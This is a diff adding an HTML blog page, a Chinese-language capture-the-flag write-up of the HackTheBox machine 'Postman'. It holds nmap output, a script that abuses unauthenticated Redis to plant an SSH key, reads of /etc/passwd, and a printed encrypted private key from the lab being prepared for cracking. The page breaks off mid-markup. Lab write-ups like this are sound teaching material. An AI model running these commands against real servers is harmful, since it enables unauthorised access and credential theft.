@@ -1,0 +1,795 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Crack id_rsa,redis 4.0.9,backup file,webmin 1.910,cve-2019-12840,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="简介通过redis未授权访问获得初始访问权限，通过备份文件可直接获得root权限或先获取Matt权限再获取root权限 靶机状态：rooted">
+<meta name="keywords" content="Crack id_rsa,redis 4.0.9,backup file,webmin 1.910,cve-2019-12840">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB Linux Postman">
+<meta property="og:url" content="https://exexute.github.io/2020/01/20/HTB-Linux-Postman/index.html">
+<meta property="og:site_name" content="owefsad 的博客">
+<meta property="og:description" content="简介通过redis未授权访问获得初始访问权限，通过备份文件可直接获得root权限或先获取Matt权限再获取root权限 靶机状态：rooted">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2022-06-24T14:37:08.084Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="HTB Linux Postman">
+<meta name="twitter:description" content="简介通过redis未授权访问获得初始访问权限，通过备份文件可直接获得root权限或先获取Matt权限再获取root权限 靶机状态：rooted">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"hide","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://exexute.github.io/2020/01/20/HTB-Linux-Postman/">
+
+
+
+
+
+  <title>HTB Linux Postman | owefsad 的博客</title>
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?2a72b138b6ef81ae123fcd18e91fa843";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">owefsad 的博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://exexute.github.io/2020/01/20/HTB-Linux-Postman/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="owefsad">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="owefsad 的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">HTB Linux Postman</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-01-20T08:54:18+08:00">
+                2020-01-20
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>简介<br>通过redis未授权访问获得初始访问权限，通过备份文件可直接获得root权限或先获取Matt权限再获取root权限</p>
+<p>靶机状态：rooted<br><a id="more"></a></p>
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p><strong>端口扫描</strong></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">$ cat scan/Postman-vuln.nmap</span><br><span class="line"><span class="comment"># Nmap 7.70 scan initiated Tue Dec 17 21:09:32 2019 as: nmap -sC -sV -p22,80,6379,10000 --script vuln -oA scan/Postman-vuln 10.10.10.160</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> postman (10.10.10.160)</span><br><span class="line">Host is up (0.38s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-csrf: Couldn<span class="string">'t find any CSRF vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-dombased-xss: Couldn'</span>t find any DOM based XSS.</span><br><span class="line">| http-enum:</span><br><span class="line">|   /css/: Potentially interesting directory w/ listing on <span class="string">'apache/2.4.29 (ubuntu)'</span></span><br><span class="line">|   /images/: Potentially interesting directory w/ listing on <span class="string">'apache/2.4.29 (ubuntu)'</span></span><br><span class="line">|   /js/: Potentially interesting directory w/ listing on <span class="string">'apache/2.4.29 (ubuntu)'</span></span><br><span class="line">|_  /upload/: Potentially interesting directory w/ listing on <span class="string">'apache/2.4.29 (ubuntu)'</span></span><br><span class="line">| http-internal-ip-disclosure:</span><br><span class="line">|_  Internal IP Leaked: 127.0.1.1</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">| http-sql-injection:</span><br><span class="line">|   Possible sqli <span class="keyword">for</span> queries:</span><br><span class="line">|     http://postman:80/js/?C=M%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://postman:80/js/?C=N%3bO%3dD%27%20OR%20sqlspider</span><br><span class="line">|     http://postman:80/js/?C=S%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://postman:80/js/?C=D%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://postman:80/js/?C=M%3bO%3dD%27%20OR%20sqlspider</span><br><span class="line">|     http://postman:80/js/?C=D%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://postman:80/js/?C=S%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://postman:80/js/?C=N%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://postman:80/js/?C=M%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://postman:80/js/?C=D%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://postman:80/js/?C=S%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|_    http://postman:80/js/?C=N%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|_http-stored-xss: Couldn<span class="string">'t find any stored XSS vulnerabilities.</span></span><br><span class="line"><span class="string">6379/tcp  open  redis   Redis key-value store 4.0.9</span></span><br><span class="line"><span class="string">10000/tcp open  http    MiniServ 1.910 (Webmin httpd)</span></span><br><span class="line"><span class="string">|_http-csrf: Couldn'</span>t find any CSRF vulnerabilities.</span><br><span class="line">|_http-dombased-xss: Couldn<span class="string">'t find any DOM based XSS.</span></span><br><span class="line"><span class="string">| http-litespeed-sourcecode-download:</span></span><br><span class="line"><span class="string">| Litespeed Web Server Source Code Disclosure (CVE-2010-2333)</span></span><br><span class="line"><span class="string">| /index.php source code:</span></span><br><span class="line"><span class="string">| &lt;h1&gt;Error - Document follows&lt;/h1&gt;</span></span><br><span class="line"><span class="string">|_&lt;p&gt;This web server is running in SSL mode. Try the URL &lt;a href='</span>https://Postman:10000/<span class="string">'&gt;https://Postman:10000/&lt;/a&gt; instead.&lt;br&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">| http-slowloris-check:</span></span><br><span class="line"><span class="string">|   VULNERABLE:</span></span><br><span class="line"><span class="string">|   Slowloris DOS attack</span></span><br><span class="line"><span class="string">|     State: LIKELY VULNERABLE</span></span><br><span class="line"><span class="string">|     IDs:  CVE:CVE-2007-6750</span></span><br><span class="line"><span class="string">|       Slowloris tries to keep many connections to the target web server open and hold</span></span><br><span class="line"><span class="string">|       them open as long as possible.  It accomplishes this by opening connections to</span></span><br><span class="line"><span class="string">|       the target web server and sending a partial request. By doing so, it starves</span></span><br><span class="line"><span class="string">|       the http server'</span>s resources causing Denial Of Service.</span><br><span class="line">|</span><br><span class="line">|     Disclosure date: 2009-09-17</span><br><span class="line">|     References:</span><br><span class="line">|       http://ha.ckers.org/slowloris/</span><br><span class="line">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</span><br><span class="line">|_http-stored-xss: Couldn<span class="string">'t find any stored XSS vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-trane-info: Problem with XML parsing of /evox/about</span></span><br><span class="line"><span class="string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span></span><br><span class="line"><span class="string"># Nmap done at Tue Dec 17 21:23:06 2019 -- 1 IP address (1 host up) scanned in 814.50 seconds</span></span><br></pre></td></tr></table></figure>
+<p>TCP端口及服务：</p>
+<ul>
+<li>22端口，ssh服务，版本：<code>OpenSSH 7.6p1</code></li>
+<li>80端口，http服务，版本：<code>Apache httpd 2.4.29 (Ubuntu)</code></li>
+<li>6379端口，redis服务，版本：<code>Redis key-value store 4.0.9</code></li>
+<li>10000端口，http服务，版本：<code>MiniServ 1.910 (Webmin httpd)</code></li>
+</ul>
+<p>redis和webmin将作为首要目标；</p>
+<h4 id="User-redis"><a href="#User-redis" class="headerlink" title="User:redis"></a>User:redis</h4><p>查看redis_rce文件内容：cat redis_rce.sh（kali、root用户下执行）</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">rm -rf ~/.ssh/id*</span><br><span class="line">ssh-keygen -t rsa</span><br><span class="line">(<span class="built_in">echo</span> -e <span class="string">"\n\n"</span>;cat ~/.ssh/id_rsa.pub;<span class="built_in">echo</span> -e <span class="string">"\n\n"</span>) &gt; owef_ssh.txt</span><br><span class="line">redis-cli -h 10.10.10.160 flushall</span><br><span class="line">cat owef_ssh.txt | redis-cli -h 10.10.10.160 -x <span class="built_in">set</span> s-key</span><br><span class="line">redis-cli -h 10.10.10.160 flushall</span><br><span class="line">redis-cli -h 10.10.10.160 config <span class="built_in">set</span> dir <span class="string">"/var/lib/redis/.ssh/"</span></span><br><span class="line">redis-cli -h 10.10.10.160 config get dir</span><br><span class="line">redis-cli -h 10.10.10.160 config <span class="built_in">set</span> dbfilename authorized_key</span><br><span class="line">redis-cli -h 10.10.10.160 save</span><br><span class="line">chmod 600 ~/.ssh/id_rsa</span><br><span class="line">ssh -i ~/.ssh/id_rsa redis@10.10.10.160</span><br></pre></td></tr></table></figure>
+<p>直接利用redis_rce.sh脚本，获得redis初始访问权限；</p>
+<p><strong>Tips:</strong></p>
+<p>关于redis的一些思路见<a href="https://book.hacktricks.xyz/pentesting/6379-pentesting-redis#authenticated-enumeration" target="_blank" rel="noopener">hacktricks.xyz:6379-pentesting-redis</a>，简单来说，redis用户的主目录可能位于”/home/redis”也可能位于”/var/lib/redis”，因此，这里不需要通过枚举/home目录下的文件，可直接通过”/var/lib/redis/.ssh/“写入ssh公钥</p>
+<p>拿到redis用户权限后，进行信息收集</p>
+<p><strong>信息收集</strong></p>
+<p>查看内核版本</p>
+<p>查看sudoers配置</p>
+<p>查看passwd文件，查找其他的用户：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ cat /etc/passwd</span><br><span class="line">redis@Postman:~$ cat /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">&lt; ... &gt;</span><br><span class="line">Matt:x:1000:1000:,,,:/home/Matt:/bin/bash</span><br><span class="line">redis:x:107:114::/var/lib/redis:/bin/bash</span><br></pre></td></tr></table></figure>
+<p>查看根目录，寻找最可能存在敏感文件的目录：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">redis@Postman:~$ ls -l /</span><br><span class="line">total 483892</span><br><span class="line">drwxr-xr-x   2 root root      4096 Aug 25 17:39 bin</span><br><span class="line">drwxr-xr-x   3 root root      4096 Aug 24 11:35 boot</span><br><span class="line">drwxr-xr-x  18 root root      3860 Jan 19 14:38 dev</span><br><span class="line">drwxr-xr-x  81 root root      4096 Oct 25 16:44 etc</span><br><span class="line">drwxr-xr-x   3 root root      4096 Sep 11 11:27 home</span><br><span class="line">lrwxrwxrwx   1 root root        33 Aug 24 11:28 initrd.img -&gt; boot/initrd.img-4.15.0-58-generic</span><br><span class="line">lrwxrwxrwx   1 root root        33 Aug 24 11:28 initrd.img.old -&gt; boot/initrd.img-4.15.0-58-generic</span><br><span class="line">drwxr-xr-x  18 root root      4096 Oct 25 16:44 lib</span><br><span class="line">drwxr-xr-x   2 root root      4096 Aug 24 11:25 lib64</span><br><span class="line">drwx------   2 root root     16384 Aug 24 11:21 lost+found</span><br><span class="line">drwxr-xr-x   2 root root      4096 Aug 24 11:21 media</span><br><span class="line">drwxr-xr-x   2 root root      4096 Aug 24 11:24 mnt</span><br><span class="line">drwxr-xr-x   2 root root      4096 Sep 11 11:28 opt</span><br><span class="line">dr-xr-xr-x 109 root root         0 Jan 19 14:37 proc</span><br><span class="line">drwx------   8 root root      4096 Oct 25 16:44 root</span><br><span class="line">drwxr-xr-x  20 root root       580 Jan 19 15:05 run</span><br><span class="line">drwxr-xr-x   2 root root      4096 Oct 25 16:38 sbin</span><br><span class="line">drwxr-xr-x   2 root root      4096 Aug 24 11:24 srv</span><br><span class="line">-rw-------   1 root root 495416320 Aug 24 11:21 swapfile</span><br><span class="line">dr-xr-xr-x  13 root root         0 Jan 19 14:56 sys</span><br><span class="line">drwxrwxrwt  12 root root      4096 Jan 19 15:02 tmp</span><br><span class="line">drwxr-xr-x  10 root root      4096 Aug 24 11:24 usr</span><br><span class="line">drwxr-xr-x  13 root root      4096 Aug 25 18:24 var</span><br><span class="line">lrwxrwxrwx   1 root root        30 Aug 24 11:28 vmlinuz -&gt; boot/vmlinuz-4.15.0-58-generic</span><br><span class="line">lrwxrwxrwx   1 root root        30 Aug 24 11:28 vmlinuz.old -&gt; boot/vmlinuz-4.15.0-58-generic</span><br><span class="line">-rw-r--r--   1 root root      2086 Aug 25 17:26 webmin-setup.out</span><br></pre></td></tr></table></figure>
+<p>最可能出现的文件列表：/etc、/home、/lost+found、/media、/opt、/root、/srv、/var，</p>
+<p>查找redis用户可读文件：</p>
+<p>查找备份文件（从webmin目录下找到的搜索命令）<code>find / -name *bak* -type f 2&gt;/dev/null</code>，找到文件：/opt/id_rsa.bak</p>
+<p><strong>查看id_rsa.bak内容</strong><br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">redis@Postman:~$ ls /opt</span><br><span class="line">id_rsa.bak</span><br><span class="line">redis@Postman:~$ cat /opt/id_rsa.bak</span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">Proc-Type: 4,ENCRYPTED</span><br><span class="line">DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C</span><br><span class="line"></span><br><span class="line">JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX</span><br><span class="line">cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2</span><br><span class="line">7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6</span><br><span class="line">cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9</span><br><span class="line">1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv</span><br><span class="line">EyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP</span><br><span class="line">UH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VY</span><br><span class="line">Sj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYK</span><br><span class="line">t+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS</span><br><span class="line">5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdke</span><br><span class="line">P2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6</span><br><span class="line">jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3Ge</span><br><span class="line">SbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3i</span><br><span class="line">l3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X</span><br><span class="line">0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8p</span><br><span class="line">S9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRR</span><br><span class="line">hkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+</span><br><span class="line">Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58V</span><br><span class="line">XTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrOD</span><br><span class="line">b6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXi</span><br><span class="line">WhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmh</span><br><span class="line">KTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92Hm</span><br><span class="line">npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ</span><br><span class="line">VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W</span><br><span class="line">X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure></p>
+<p><strong>转换为john格式，进行破解</strong><br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">root@owefsad:~<span class="comment"># cat postman.id_rsa</span></span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">Proc-Type: 4,ENCRYPTED</span><br><span class="line">DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C</span><br><span class="line"></span><br><span class="line">JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX</span><br><span class="line">cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2</span><br><span class="line">7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6</span><br><span class="line">cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9</span><br><span class="line">1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv</span><br><span class="line">EyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP</span><br><span class="line">UH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VY</span><br><span class="line">Sj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYK</span><br><span class="line">t+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS</span><br><span class="line">5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdke</span><br><span class="line">P2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6</span><br><span class="line">jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3Ge</span><br><span class="line">SbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3i</span><br><span class="line">l3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X</span><br><span class="line">0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8p</span><br><span class="line">S9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRR</span><br><span class="line">hkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+</span><br><span class="line">Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58V</span><br><span class="line">XTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrOD</span><br><span class="line">b6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXi</span><br><span 